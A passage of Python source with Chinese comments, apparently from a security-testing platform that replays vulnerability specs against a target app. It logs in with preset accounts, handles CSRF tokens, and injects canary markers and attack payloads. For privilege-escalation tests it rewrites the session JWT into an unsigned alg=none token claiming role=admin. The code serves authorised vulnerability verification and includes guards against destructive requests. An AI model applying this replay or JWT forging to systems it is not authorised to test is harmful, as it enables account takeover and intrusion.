            # 17 条 spec 零 attempt 且零日志，无法判断是哪个分支挡的。统一加 [no-send] 标记，
            # 便于 grep（约定：凡是「没发请求就返回」的分支都要带这个标记）。
            logger.warning(
                "[D1.replay][no-send:invalid_or_probe_endpoint] family=%s ep=%r file=%s",
                spec.get("family"), _ep, str(spec.get("file") or ""),
            )
            return DastImpact(blocked=True, error="invalid_or_probe_endpoint", provisional=False)
        auth_context = session or target.get("auth_context") or spec.get("auth_context") or {}
        if not isinstance(auth_context, dict):
            auth_context = {}
        _accounts = accounts if accounts is not None else (target.get("accounts") or spec.get("accounts") or [])
        if isinstance(_accounts, dict):
            _accounts_ready = bool(_accounts.get("attacker")) or bool(_accounts.get("victim"))
        else:
            _accounts_ready = bool(_accounts)

        category = str(spec.get("category") or "") or normalize_category(
            spec.get("family", ""), spec.get("exploit_spec") or {}, spec
        )

        def _route():
            # 注意：这里必须声明 nonlocal，否则 `_accounts = _boot` 会把 _accounts 变成
            # _route 的局部变量，走到路由 2 时 UnboundLocalError。
            nonlocal _accounts, _accounts_ready
            if is_business_logic(category):
                from src.iast.attack_context import needs_dual_accounts
                if needs_dual_accounts(category) and not _accounts_ready:
                    _boot = self.bootstrap_accounts(target, spec)
                    if _boot:
                        _accounts = _boot
                        _accounts_ready = True
                if not needs_dual_accounts(category) or _accounts_ready:
                    self._backfill_accounts_json(spec, _accounts)
                    return self._replay_business_logic(category, spec, target, _accounts)
                # 双账户不可用（无预设账户且 bootstrap 失败）：业务族无法做差分，
                # 但不能假装验证过、也不应静默放弃 —— 回落到 canary 通道（X-SASTAI-Trace 探针），
                # 标 attack_degraded=True 供 I2/D2 如实判定（不伪造差分证据，也不丢请求）。
                logger.warning(
                    "[D1.replay] 业务族 %s 无可用双账户，回落 canary 通道并标 attack_degraded",
                    category,
                )
                # 继续走下方 route 2（_replay_attack 带 canary 头）
            # 路由 2：普通漏洞 → 头 canary 供 I1 关联 + 参数位投放 A2 的真实 payload
            # 重放恒为未认证态，请求被 formLogin 重定向到登录页（HTTP 200 但返回登录页），
            # 业务 sink 从未执行 → iast_state 全量 no-arrival（实测 19 条，其中 17 条
            # verification_status 却已被判 confirmed_exploitable，形成「确认了但没有运行时证据」
            # 的自相矛盾读数）。技术族只需单个会话即可，与业务族的双账号差分无关。
            # 判据：配置了 target/spec.login 且当前无任何会话凭据时才登录，未配置时行为不变。
            _tech_session = dict(auth_context) if isinstance(auth_context, dict) else {}
            # ⇒ 兜底登录根本没被调用 ⇒ 重放全程未认证。实测 本轮 523 条重放里
            # **476 条 302**（Shiro 重定向到登录页），业务代码一次都没进，
            # 105 条 vertical_privesc 全部 no-iast-evidence。
            # 判据：三处任一存在即视为「配了登录」，与 `_fallback_auth_cookies` 内部的
            # `for key in ("auth", "login")` 保持一致。
            if (not _tech_session.get("auth_cookies") and not _tech_session.get("auth_headers")
                    and (target.get("login") or spec.get("login") or target.get("auth"))):
                # 会话缓存：一轮扫描里 20+ 条技术族 spec 共用一次登录，避免逐 spec 重复登录。
                _cache = getattr(self, "_tech_session_cache", None)
                if _cache is None:
                    _cache = {}
                    self._tech_session_cache = _cache
                _cache_key = (str(target.get("service_url") or ""),
                              str((target.get("login") or {}).get("url") or ""))
                if _cache_key in _cache:
                    _tech_session = dict(_cache[_cache_key])
                else:
                    if not _accounts_ready:
                        _boot = self.bootstrap_accounts(target, spec)
                        if _boot:
                            _accounts = _boot
                            _accounts_ready = True
                    _pool = _accounts if isinstance(_accounts, dict) else {}
                    _acct = _pool.get("victim") or _pool.get("attacker") or {}
                    if isinstance(_acct, dict):
                        if _acct.get("auth_cookies"):
                            _tech_session["auth_cookies"] = _acct["auth_cookies"]
                        if _acct.get("auth_headers"):
                            _tech_session["auth_headers"] = _acct["auth_headers"]
                    if not (_tech_session.get("auth_cookies") or _tech_session.get("auth_headers")):
                        _fb = _fallback_auth_cookies(target)
                        if _fb:
                            _tech_session["auth_cookies"] = _fb
                    if _tech_session.get("auth_cookies") or _tech_session.get("auth_headers"):
                        _cache[_cache_key] = dict(_tech_session)
                        logger.info("[D1.replay] 技术族会话就绪（%s），重放将携带认证态",
                                    _cache_key[0] or "target")
                    else:
                        logger.warning("[D1.replay] 技术族登录未取得会话凭据（login 已配置但 bootstrap 无产出），"
                                       "本轮重放仍为未认证态")
            return self._replay_attack(spec, target, _tech_session or auth_context, _accounts)

        # 非业务族（category 为空的 spec）走 _replay_attack，此前完全不受回滚保护 ——
        from src.iast.attack_context import (RESTORE_AFTER_ENABLED, _RESTORE_AFTER_CATEGORIES,
                                             classify_destructive_operation)
        _cat_d = classify_destructive_operation(spec.get("http_method"), _ep)
        if not (RESTORE_AFTER_ENABLED and _cat_d in _RESTORE_AFTER_CATEGORIES):
            return _route()

        from src.iast.orchestrator import DastImpact
        with self.restorable_profile(target, _accounts, spec) as _st:
            if not _st.get("baseline"):
                return DastImpact(blocked=True, error="no_restore_baseline", provisional=False)
            _res = _route()
        if _st.get("restored") is False:
            _note = _st.get("note") or ""
            logger.error("[R26.restore] replay 回滚失败，判据作废：rid=%s %s", _st.get("rid"), _note)
            if isinstance(_res, DastImpact):
                _res.error = "restore_failed: %s" % _note
                _res.provisional = True
                _res.business_logic = dict(getattr(_res, "business_logic", None) or {})
                _res.business_logic["confirmed"] = False
                _res.business_logic["restore_failed"] = True
            elif isinstance(_res, dict):
                _res["confirmed"] = False
                _res["verdict"] = "restore_failed"
                _res["restore"] = {"attempted": True, "ok": False, "note": _note,
                                   "rid": _st.get("rid") or ""}
        return _res

    def bootstrap_accounts(self, target: Dict[str, Any], spec: Optional[Dict[str, Any]] = None) -> Optional[Dict[str, Any]]:
        """真实登录 bootstrap：按 target.login / spec.login 配置对预置账号逐一登录取 token，
        返回 {attacker:{...}, victim:{...}} 供业务逻辑差分重放使用。

        这是 Point3 的 auth bootstrap 落点——此前业务 finding 在流水线里永远拿不到账户，
        于是被路由到 canary 攻击路径（对越权类毫无意义）。本方法让 D1 在重放前真登录取凭据。

        配置 schema（target.login，由 workspace / external_target 提供，平台不内置任何凭据）：
          url           登录端点（相对 service_url 或绝对 URL）
          method        登录 HTTP 方法（默认 POST）
          token_field   响应体 JSON 中 token 字段名（默认 token）
          token_header  承载 token 的请求头名（默认 Authorization）
          token_prefix  头值前缀（默认 "Bearer "，置空则直接放 token）
          cookie_name   非空时 token 改走该 cookie（如 mall_token）
          forge_alg_none 垂直越权验证：把登录取得的 JWT 改写成 alg=none 无签名令牌
          content_type  登录提交方式：json（默认，body 为 JSON）或 form（x-www-form-urlencoded，对应 Spring @RequestParam）
          credentials   [{role, username, password, stance?}]，无 stance 则按特权排序分 attacker/victim
        未配置 login / 无 credentials / 登录全失败 → 返回 None（调用方降级 no_evidence）。
        """
        login = (target or {}).get("login") or (spec or {}).get("login")
        if not isinstance(login, dict):
            return None
        creds = login.get("credentials") or []
        if not creds:
            return None
        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        url = str(login.get("url") or "")
        if not url:
            return None
        if not url.startswith("http"):
            url = urljoin(base_url + "/", url.lstrip("/")) if base_url else ("/" + url.lstrip("/"))
        method = str(login.get("method") or "POST").upper()
        token_field = str(login.get("token_field") or "token")
        token_header = str(login.get("token_header") or "Authorization")
        token_prefix = str(login.get("token_prefix") or "Bearer ")
        cookie_name = str(login.get("cookie_name") or "")
        # P0-3：alg:none 伪造只对该类目真正需要的族生效，绝不大范围开启。
        # 改写成 role=admin，水平越权/竞态的差分判定会被污染（attacker 不再是普通用户）。
        # 仅 vertical_privesc（垂直越权靠 alg:none 提权）与 signature_bypass（JWT 绕过自身）开启。
        _forge_requested = bool(login.get("forge_alg_none"))
        _spec_cat = ((spec or {}).get("category") or "").lower()
        _FORGE_CATS = frozenset({
            "vertical_privesc", "vertical",
            "signature_bypass", "signature", "jwt_forgery", "jwt", "alg_none",
        })
        forge = _forge_requested and _spec_cat in _FORGE_CATS
        # 登录提交方式：json（默认，application/json body）或 form（application/x-www-form-urlencoded，
        login_ct = str(login.get("content_type") or "json").lower()
        # 配置 schema（login.csrf，可选；未配置时行为与此前完全一致）：
        #   fetch_url  取 token 的页面（相对 service_url 或绝对 URL，缺省同 login.url）
        #   field      提交时的字段名（默认 _csrf）
        #   pattern    从页面正文提取 token 的正则，需含 1 个捕获组
        #   header     可选：改从指定响应头取 token（不走正文正则）
        # token 与服务端 session 绑定，故必须与预取得到的 cookie 一并回传。
        csrf_cfg = login.get("csrf") if isinstance(login.get("csrf"), dict) else None
        csrf_field = str((csrf_cfg or {}).get("field") or "_csrf")
        csrf_header = str((csrf_cfg or {}).get("header") or "")
        csrf_pattern = str((csrf_cfg or {}).get("pattern") or "")
        csrf_fetch_url = str((csrf_cfg or {}).get("fetch_url") or "")
        if csrf_cfg and not csrf_fetch_url.startswith("http"):
            csrf_fetch_url = urljoin(base_url + "/", csrf_fetch_url.lstrip("/")) if base_url else ("/" + csrf_fetch_url.lstrip("/"))

        def _fetch_csrf():
            """返回 (csrf_token, cookies_dict)；任一环节失败返回 ('', {})，由调用方降级。"""
            if not csrf_cfg:
                return "", {}
            try:
                pre = requests.get(
                    csrf_fetch_url or url, timeout=10, allow_redirects=True,
                    proxies={"http": None, "https": None},
                )
            except Exception as exc:
                logger.warning("[D1.bootstrap] CSRF 预取失败（%s）：%s", csrf_fetch_url or url, exc)
                return "", {}
            token = ""
            if csrf_header:
                token = pre.headers.get(csrf_header) or ""
            if not token and csrf_pattern:
                try:
                    m = re.search(csrf_pattern, pre.text or "")
                    token = m.group(1) if m else ""
                except Exception:
                    token = ""
            if not token:
                logger.warning("[D1.bootstrap] CSRF 预取未取到 token（fetch=%s）", csrf_fetch_url or url)
            return token, pre.cookies.get_dict()

        built: List[Dict[str, Any]] = []
        for c in creds:
            c = c if isinstance(c, dict) else {}
            uname = str(c.get("username") or "")
            pwd = str(c.get("password") or "")
            role = str(c.get("role") or "")
            if not uname:
                continue
            resp = None
            # 不应直接判账户不可用。加重试（3 次，指数退避 1/2/4s）吸收瞬时不可用；仍失败才跳过该账户。
            for _attempt in range(3):
                # CSRF 与 session 绑定，每次尝试都重新预取（重试时旧 token 已失效）
                csrf_token, pre_cookies = _fetch_csrf()
                try:
                    if login_ct == "form":
                        # 表单登录：x-www-form-urlencoded（Spring @RequestParam 取 username/password）
                        payload = {"username": uname, "password": pwd}
                        if csrf_token:
                            payload[csrf_field] = csrf_token
                        resp = requests.request(
                            method, url,
                            data=payload,
                            cookies=pre_cookies or None,
                            timeout=10, allow_redirects=False,
                            proxies={"http": None, "https": None},
                        )
                    else:
                        payload = {"username": uname, "password": pwd}
                        if csrf_token:
                            payload[csrf_field] = csrf_token
                        resp = requests.request(
                            method, url,
                            json=payload,
                            cookies=pre_cookies or None,
                            timeout=10, allow_redirects=False,
                            proxies={"http": None, "https": None},
                        )
                    break
                except Exception as exc:  # 登录失败不致命：重试后跳过该账户，其余继续
                    if _attempt < 2:
                        time.sleep(1 * (_attempt + 1))
                        continue
                    logger.warning("[D1.bootstrap] 登录 %s 重试 3 次仍失败（跳过）：%s", uname, exc)
                    break
            if resp is None:
                # 网络层 3 次全失败（已告警），跳到下一账户
                continue
            # token 提取优先级：cookie_name（Set-Cookie）→ 响应体 JSON token_field → 认证头。
            token = ""
            if cookie_name:
                # token 来源优先级：resp.cookies（real requests.Response / 带 cookies 的 mock）
                # → Set-Cookie 头解析 → 预取阶段会话 cookie → 响应体 JSON 的 token_field。
                # 此前直接用 resp.cookies.get 假定 resp 必有 cookies 属性，遇到 token 落在响应体
                # JSON（如测试 _LoginResp 或部分靶场）的账户会 AttributeError → bootstrap 整账户失败。
                _resp_cookies = getattr(resp, "cookies", None)
                token = _resp_cookies.get(cookie_name) if isinstance(_resp_cookies, dict) else ""
                if not token:
                    token = _extract_set_cookie_value(
                        resp.headers.get("Set-Cookie", ""), cookie_name) or ""
                # 会话固定防护下 JSESSIONID 登录后会轮换；若响应未回写（如某些 200 分支），
                # 回退到预取阶段建立的会话 cookie，保证后续重放仍带认证态。
                if not token:
                    token = (pre_cookies or {}).get(cookie_name) or ""
                # 兜底：Set-Cookie 无该 token 时，从响应体 JSON 的 token_field 取
                # （兼容 token 落在 body、但要求以 cookie 形式回放的真实靶场）。
                if not token:
                    try:
                        _body = resp.json() if getattr(resp, "text", "") else {}
                        if isinstance(_body, dict):
                            token = str(_body.get(token_field) or _body.get("token") or "")
                    except Exception:
                        token = ""
            if not token:
                try:
                    body = resp.json() if resp.text else {}
                    if isinstance(body, dict):
                        token = str(body.get(token_field) or body.get("token") or "")
                except Exception:
                    token = ""
            if not token:
                for hname in (token_header.lower(), "authorization", "x-auth-token", "x-access-token"):
                    hv = resp.headers.get(hname)
                    if hv:
                        token = hv.split(" ", 1)[-1] if " " in hv and "authorization" in hname else str(hv)
                        break
            if not token:
                logger.warning("[D1.bootstrap] 登录 %s 未取到 token（跳过）", uname)
                continue
            # F1：在 alg=none 伪造改写声明之前，先从真实 token 取出 uid（JWT 含 uid 声明），
            # 存入账户 dict 的 user_id，供 replay_bola 在 VICTIM_FROM_POOL 哨兵下解析真实受害者资源 id。
            _real_uid = _decode_jwt_uid(token)
            if forge:
                try:
                    from src.iast.account_discovery import forge_none_alg_jwt
                    token = forge_none_alg_jwt(token, extra_claims={"role": "admin"})
                except Exception as exc:
                    logger.warning("[D1.bootstrap] 伪造 none-alg JWT 失败（用原 token）：%s", exc)
            acct: Dict[str, Any] = {"role": role, "username": uname}
            if cookie_name:
                acct["auth_cookies"] = {cookie_name: token}
            else:
                acct["auth_headers"] = {token_header: f"{token_prefix}{token}".strip()}
            if _real_uid is not None:
                acct["user_id"] = str(_real_uid)
            built.append(acct)

        if not built:
            logger.warning(
                "[D1.bootstrap] 所有预置账户登录均失败（built 为空）→ 返回 None，相关 spec 降级 no_evidence。"
                "请核查预置账户在扫描窗口的可用性（服务是否存活 / 凭据是否正确 / 登录端点是否可达）。"
            )
            return None
        # 按特权排序：attacker=最低特权（首），victim=最高特权（末）。
        built.sort(key=lambda a: _privilege_rank(a.get("role")))
        out: Dict[str, Any] = {}
        for stance, acct in (("attacker", built[0]), ("victim", built[-1])):
            # 把 line 493 刚解出的 user_id 又过滤掉 → replay_bola 的 VICTIM_FROM_POOL 哨兵解析
            # （d1_service.py:1065/1067 读 victim/attacker 的 user_id）恒取 None → 哨兵字面量被当作
            # 资源 id 拼进 URL（如 /order/VICTIM_FROM_POOL/pay）→ 靶场类型绑定 400 → 探针
            # findById/AuthzDecision 钩子永不命中 → BOLA 从「机制确认」退化为 no-iast-evidence
            out[stance] = {k: v for k, v in acct.items()
                           if k in ("auth_headers", "auth_cookies", "role", "username", "user_id")}
        # P0-3 可见性：把 bootstrap 出的双账户（脱敏，仅 role/username，不落真实 token）回写
        # spec.accounts_json，便于排障时查看「该 spec 实际取到了哪些账户」。仅在 db 已注入时生效。
        # （此前未传 db，回写落在临时库、恒不落盘）。
        self._backfill_accounts_json(spec, out)
        self._persist_bootstrap_accounts(target, spec, out)
        return out

    def _persist_bootstrap_accounts(self, target: Any, spec: Any, out: Dict[str, Any]) -> None:
        """把 bootstrap 出的双账号（含真实会话）回写 dast_accounts，使持久化名册与真实会话一致。

        之后，库里留下的仍是上一次 import 的旧行（同 subject=joychou、两条 JSESSIONID 完全相同、
        且是早已失效的死会话），M11 的 dual_account_same_subject 因此**永远报红**——真实已修好的配置
        在闸门上看还是红的，闸门就失去意义。

        三条防呆约束（任一不满足即跳过，绝不把名册改坏）：
          1. 只在 attacker / victim **都齐全**时回写：绝不因某个账户登录失败，把双账号名册缩成单条
             （那会让「缺双账号」这类真实缺陷被自己的失败掩盖成「已配置」）；
          2. 只在能定位到 app_id 时回写（target / spec 上取 app_id，取不到就跳过，绝不猜、不错写别的应用）；
          3. 任何异常只告警不抛出，落盘失败绝不影响本次重放（重放用的是内存里的 out）。
        """
        if self.db is None or not isinstance(out, dict) or len(out) != 2:
            return
        holder = target if isinstance(target, dict) else {}
        holder = holder or (spec if isinstance(spec, dict) else {})
        app_id = str(holder.get("app_id") or holder.get("id") or "").strip()
        if not app_id and isinstance(spec, dict):
            app_id = str(spec.get("workspace_id") or "").strip()
        if not app_id:
            return
        try:
            now = datetime.utcnow().isoformat()
            for stance in ("attacker", "victim"):
                acct = out.get(stance)
                if not isinstance(acct, dict):
                    continue
                self.db.execute(
                    "INSERT OR REPLACE INTO dast_accounts "
                    "(app_id, account_id, role, tenant, subject, auth_headers_json, "
                    "auth_cookies_json, token_ref, metadata_json, created_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        app_id,
                        stance,
                        str(acct.get("role") or stance),
                        "",
                        str(acct.get("username") or stance),
                        self.db.dumps(acct.get("auth_headers") or {}),
                        self.db.dumps(acct.get("auth_cookies") or {}),
                        "",
                        self.db.dumps({"bootstrap": True, "stance": stance,
                                       "source": "bootstrap_accounts"}),
                        now,
                    ),
                )
            # 去重：同一个 (app_id, stance) 只保留最新一条（即刚写入的那条）。
            # 否则历史 import 留下的旧行会与 bootstrap 新行并存——sqlite 的 INSERT OR REPLACE
            # 是按主键替换、不会顶掉同名册的旧行，旧行还带着早已失效的死会话，M11 的
            # dual_account_same_subject 会因为一堆陈旧旧行继续报红，闸门照样看不出已修好。
            self.db.execute(
                "DELETE FROM dast_accounts WHERE app_id = ? "
                "AND account_id IN ('attacker', 'victim') "
                "AND id NOT IN (SELECT MAX(id) FROM dast_accounts "
                "WHERE app_id = ? AND account_id IN ('attacker', 'victim') GROUP BY account_id)",
                (app_id, app_id),
            )
        except Exception as exc:  # 落盘失败不致命
            logger.warning("[D1.bootstrap] 回写 dast_accounts 失败（跳过，不影响重放）：%s", exc)

    @staticmethod
    def _redact_accounts(accounts: Optional[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """脱敏：仅保留 role/username，绝不落真实 token / cookie / header。"""
        if not isinstance(accounts, dict):
            return None
        out: Dict[str, Any] = {}
        for stance in ("attacker", "victim"):
            a = accounts.get(stance)
            if isinstance(a, dict):
                out[stance] = {"role": a.get("role"), "username": a.get("username")}
        return out or None

    def _backfill_accounts_json(self, spec: Optional[Dict[str, Any]],
                               accounts: Optional[Dict[str, Any]]) -> None:
        """把实际用于重放的账户（脱敏）回写 spec.accounts_json。

        （target/spec.accounts）而非 bootstrap」的 spec 永远拿不到 accounts_json（恒为默认 '[]'），
        现把回写抽成独立方法，在 replay 编排器对「任何已就绪账户」统一调用，保证可观测性。
        仅在 db 已注入且 spec 带 id 时生效。
        """
        if self.db is None or not spec or spec.get("id") is None:
            return
        try:
            red = self._redact_accounts(accounts)
            if red is None:
                return
            self.db.execute(
                "UPDATE trigger_specs SET accounts_json = ? WHERE id = ?",
                (self.db.dumps(red), int(spec["id"])),
            )
        except Exception as exc:
            logger.warning("[D1.bootstrap] 回写 accounts_json 失败（跳过）：%s", exc)

    def _replay_business_logic(self, category: str, spec: Dict[str, Any],
                              target: Dict[str, Any], accounts: Any) -> "DastImpact":
        """业务逻辑族：委托 business_logic.verify 做真攻击，结果适配为 DastImpact。

        replay_* 返回 Dict（confirmed/verdict/leaked_victim_identifiers/...），
        而编排器消费 DastImpact，故在此做适配：结果整体塞进 slices['business_logic']，
        并据 confirmed 置 impact_hint，供 I2 与普通漏洞走同一套裁决口径。
        """
        from src.iast.orchestrator import DastImpact

        try:
            from src.iast import business_logic
            # replay_* 的 victim_identifiers / accounts_json 回填写进临时库后即随进程消失，
            # 真实 DB 永远为空。
            result = business_logic.verify(category, spec, target, accounts=accounts,
                                           gateway=getattr(self, "gateway", None),
                                           db=self.db)
        except Exception as exc:
            logger.warning("[D1.route] 业务逻辑重放 %s 失败（交 I2 按 provisional 处理）：%s", category, exc)
            return DastImpact(error=f"business-logic replay failed: {exc}", provisional=True)

        if not isinstance(result, dict):
            return DastImpact(error="business-logic replay returned non-dict", provisional=True)

        status = int(result.get("status_code") or 0)
        confirmed = bool(result.get("confirmed"))
        _guard = result.get("destructive_guard") if isinstance(result, dict) else None
        impact = DastImpact(
            reached=status > 0,
            status_code=status,
            body=str(result.get("response_summary") or "")[:2000],
            response_summary=str(result.get("response_summary") or ""),
            # 差分结果挂专用字段而非塞 slices（slices 是 per-param 语义）。
            business_logic=dict(result),
            destructive_guard=dict(_guard) if isinstance(_guard, dict) else {},
        )
        if isinstance(_guard, dict) and _guard.get("action") == "skip":
            # 闸门跳过：未投放，不是「靶场无证据」，也不能当弱证据放行 → 显式落因。
            impact.error = "skipped_destructive_guard: %s" % (_guard.get("reason") or "")
        # 越权/竞态的成功判据是「差分泄露或并发越界」，不是 HTTP 状态码，
        # 故把 confirmed 一并落进 business_logic，避免 I2 只看到 reached 就当弱证据放行。
        impact.business_logic["confirmed"] = confirmed
        return impact

    # 注入字面 canary 字符串会被靶场类型绑定拒绝（如 Spring @RequestParam Long productId 绑定失败
    # → 400/500），canary 永远到不了 sink，进而被误判「无证据」。对此类参数改用 typed canary
    # （合法形态 + 可搜索指纹），保留「数据到达 sink」的可达性证据；破坏性 payload（真攻击）照投不误。
    _NUMERIC_PARAM_NAMES = frozenset({
        "id", "ids", "uid", "userid", "user_id", "productid", "product_id", "orderid",
        "order_id", "addressid", "address_id", "page", "size", "count", "num", "number",
        "status", "type", "code", "year", "month", "day", "amount", "price", "quantity",
        "offset", "limit", "index", "version",
    })

    def _is_numeric_param(self, param_name: str, spec: Optional[Dict[str, Any]]) -> bool:
        pt = str((spec or {}).get("param_type") or "").lower()
        if pt in ("numeric_id", "int", "integer", "long", "number", "float", "double", "bigint"):
            return True
        name = str(param_name or "").lower().rstrip("s")
        if not name:
            return False
        if name.endswith("id") or name in self._NUMERIC_PARAM_NAMES:
            return True
        return False

    # URL 语义参数名：SSRF / 开放重定向一类入参在应用侧会被 new URL(value) 解析，
    # 整体替换成裸 canary 会直接抛 MalformedURLException("no protocol")，请求在应用
    # 最外层就断链、永远到不了 sink。
    _URL_PARAM_NAMES = frozenset({
        "url", "uri", "target", "dest", "destination", "redirect", "redirecturl",
        "redirect_uri", "next", "callback", "link", "src", "image", "img",
    })

    def _is_url_param(self, param_name: str, spec: Optional[Dict[str, Any]]) -> bool:
        """URL 语义参数判定：族为 ssrf / open-redirect，或参数名属 URL 语义集合。"""
        fam = str((spec or {}).get("family") or "").strip().lower()
        if fam in ("ssrf", "open-redirect", "open_redirect"):
            return True
        return str(param_name or "").strip().lower() in self._URL_PARAM_NAMES

    def _canary_for_param(self, spec: Dict[str, Any], param_name: str,
                          fallback_marker: str, base_url: str = "") -> str:
        """按参数类型返回应注入的 canary。

        - deserialization：保持 base64 形态，不退化成数值
        - 数值参数：typed numeric canary（合法整数形态 + 指纹）
        - URL 语义参数：完整 URL + canary 身份段
        - 其余：原样返回 fallback_marker

        的入参直接喂给 new URL(url)，裸 canary 会抛 no protocol，DP 层看到的
        no-arrival 其实是应用最外层格式校验拒绝，与路由、探针覆盖均无关。
        """
        family = str((spec or {}).get("family") or "")
        if family.lower() == "deserialization":
            return fallback_marker  # 反序列化 sink 必须 base64 编码，不能退化成数值
        if self._is_numeric_param(param_name, spec):
            from src.iast.canary import CanaryFactory
            return CanaryFactory.typed_for_param_type(family, "numeric_id")
        if self._is_url_param(param_name, spec):
            # 注入「靶场自身 host + canary 路径」：既保证应用侧 new URL 可解析、请求
            # 真实发出，又让 canary 身份段出现在 sink 实参文本里供探针现场断言
            # （HookRuntime.resolveCanaryForSink 扫实参 / URL 串）。host 取靶场自身
            # service_url，不向外网发起请求。
            from src.iast.canary import CanaryFactory
            host = str(base_url or "").strip().rstrip("/")
            if not host:
                host = "http://127.0.0.1:8080"
            # typed_for_param_type(family, "url") 是「身份段在前、路径在后」的相对形态
            # （s4st41<hex>/<fp>/<rand>），必须补一个 "/" 才是合法的完整 URL，
            # 否则 "http://host:8080s4st41..." 会被端口解析拒绝。
            return host + "/" + CanaryFactory.typed_for_param_type(family, "url")
        return fallback_marker

    # ----------------------------------------------------------------------
    # 背景：应用侧对输入做 base64 / 双层 base64 / hex 等变换后污点才抵达 sink 时，明文 canary
    # 会被先编码导致 no-arrival 漏判。对策：对 plain 之外的 encoded 形态各补发一次探针重放，
    # 共享同一身份段（run_nonce 绑定），由编排器 find_identity + match_best_of 取最强态。
    # 默认关闭：基准靶场不对输入做编解码，4 倍重放只会徒增探针负载与验证轮耗时且对基准无增益；
    # 仅当目标确有输入编解码时才经 SAST_AI_D1_MULTI_FORM_ENABLED=1 开启。
    # ----------------------------------------------------------------------
    def _multi_form_enabled(self, spec: Dict[str, Any]) -> bool:
        import os
        return bool(os.environ.get("SAST_AI_D1_MULTI_FORM_ENABLED"))

    def _fire_multi_form_probes(self, spec: Dict[str, Any], method: str, url: str, headers: Dict[str, str],
                                cookies: Dict[str, str], query: Dict[str, str], body: Any,
                                content_type: str, param_name: str, param_location: str) -> None:
        """对 b64 / b64_double / hex 形态各补发一次纯 canary 探针重放（共享身份段）。

        仅处理 query / body(form) / header / cookie / path 常见形态，multipart 跳过（best-effort）。
        补投不携带攻击 payload，也不影响主重放返回的 DastImpact——只是多打几次请求让探针有机会
        观测到「被编码后才抵达 sink」的 canary（plain 主重放已覆盖未编码场景）。
        """
        try:
            from src.iast.canary import CanaryFactory
            import re as _re
        except Exception:
            return
        if not param_name:
            return
        family = str(spec.get("family") or "")
        tm = str(spec.get("taint_marker") or "")
        # 从已登记 taint_marker 提取 run_nonce（前 4 hex），使补投形态与 plain 共享同一身份段。
        _m = _re.search(r"s4st41([0-9a-fA-F]{4})", tm)
        run_nonce = _m.group(1) if _m else None
        try:
            forms = CanaryFactory.multi_form(family, run_nonce=run_nonce)
        except Exception:
            return
        extras = {k: v for k, v in forms.items() if k != "plain"}
        if not extras:
            return
        ploc = str(param_location or "query").lower()
        _ct_low = (content_type or "").lower()
        for _fname, _form in extras.items():
            try:
                _q = dict(query or {})
                _b = dict(body) if isinstance(body, dict) else None
                _h = dict(headers or {})
                _c = dict(cookies or {})
                _p = url or ""
                if ploc == "query":
                    _q[param_name] = _form
                elif ploc in ("body", "form"):
                    _b = _b or {}
                    _b[param_name] = _form
                elif ploc == "header":
                    _h[param_name] = _form
                elif ploc == "cookie":
                    _c[param_name] = _form
                elif ploc == "path":
                    _p = _p.replace("{" + param_name + "}", _form).replace(":" + param_name, _form)
                else:
                    continue  # multipart 等跳过
                _mb_data, _mb_json = body_data_json(_b, content_type)
                requests.request(
                    method, _p, params=_q or None, headers=_h or None, cookies=_c or None,
                    data=_mb_data,
                    json=_mb_json,
                    timeout=10, allow_redirects=False,
                )
            except Exception as _e:
                logger.debug("[D1.multi_form] 补投 %s 形态失败（忽略，不影响主重放）：%s", _fname, _e)

    def _replay_attack(self, trigger_spec: Dict[str, Any], target: Dict[str, Any], session: Any = None, accounts: Any = None) -> "DastImpact":
        """ D1 重放执行契约：TriggerSpec → 实际 HTTP 请求。

        与触发事务编排器调用约定对齐：replay(trigger_spec, target)。文档  原签名
        `replay(trigger_spec, session, accounts)` 的三参形式，在此收敛为「target 承载
        session(auth_context) / accounts」的两参形式，避免编排器多传参；保留 session /
        accounts 可选形参以兼容文档原签名（未显式传入时从 target / trigger_spec 派生）。

        职责：
        - 请求构造：按 target_endpoint + http_method，把 taint_marker（即 canary）注入
          param_name 的 param_location（query / header / cookie / body / path）。
        - representative_request_params：multi-match 全参数带标、一次回放（4.7.2）。
        - 重试（决议）：瞬态 5xx / 超时，D1 自重试 3 次 + 指数退避；A0 已确认环境与
          探针在线，反复失败多属真实异常而非环境，故不自行判 ambiguous，仍失败标
          provisional 交 I2 裁决。
        - 输出：HTTP 响应（status / body）作为 DAST 影响证据；multi-match 给每假说的
          独立切片（slices）。
        - auth_context 多步登录 / BOLA 多账户重放：本期占位（仅单 principal 注入重放），
          属  Phase 2 危害确证储备，不在本期注入类链路交付范围。
        """
        from src.iast.orchestrator import DastImpact

        spec = dict(trigger_spec or {})
        # （删除/改密/资金/状态覆写），同样走哨兵 id 归一或跳过，绝不真删靶标数据。
        from src.iast.attack_context import neutralize_destructive_spec
        spec, _dg = neutralize_destructive_spec(spec)
        if _dg.get("action") == "skip":
            logger.warning(
                "[D1.replay][no-send:destructive_guard] family=%s ep=%s reason=%s",
                spec.get("family"), spec.get("target_endpoint"), _dg.get("reason") or "",
            )
            return DastImpact(error="skipped_destructive_guard: %s" % (_dg.get("reason") or ""),
                              provisional=False)
        target = dict(target or {})
        # session / accounts 兼容文档三参签名：未显式传入则从 target / trigger_spec 取
        auth_context = session or target.get("auth_context") or spec.get("auth_context") or {}
        if not isinstance(auth_context, dict):
            auth_context = {}
        _accounts = accounts if accounts is not None else (target.get("accounts") or spec.get("accounts") or [])

        base_url = str(target.get("service_url") or "").rstrip("/")
        endpoint = str(spec.get("target_endpoint") or "").lstrip("/")
        method = str(spec.get("http_method") or "GET").upper()
        taint_marker = spec.get("taint_marker") or ""
        param_name = spec.get("param_name") or ""
        content_type = str(spec.get("content_type") or "")

        headers = dict(auth_context.get("auth_headers") or {})
        cookies = dict(auth_context.get("auth_cookies") or {})
        # 未认证重放一律 302 → /login，业务 sink 根本不执行。workspace 4 明明配了
        # `login.credentials`，`_fallback_auth_cookies(target)` 实测也能拿到
        # JSESSIONID + XSRF-TOKEN，但 623/624 的重放仍整片 302（sqli 全部探针
        # 302、ssrf 部分 spec 首页就是登录页）——根因是 `replay` 那一层的登录
        # 分支依赖 auth_context 传参形态，编排器实际传入的 session 不满足条件时
        # 整段被跳过，兜底登录一次都没被调用。
        #
        # 这里在**真正构造请求的位置**做最后一道自愈：只要手上完全没有凭据，
        # 且 target 带登录配置，就直接取一次会话。不依赖上游是否走对分支，
        # 已有凭据的靶场行为完全不变；`get_manager` 是进程级单例且带 TTL，
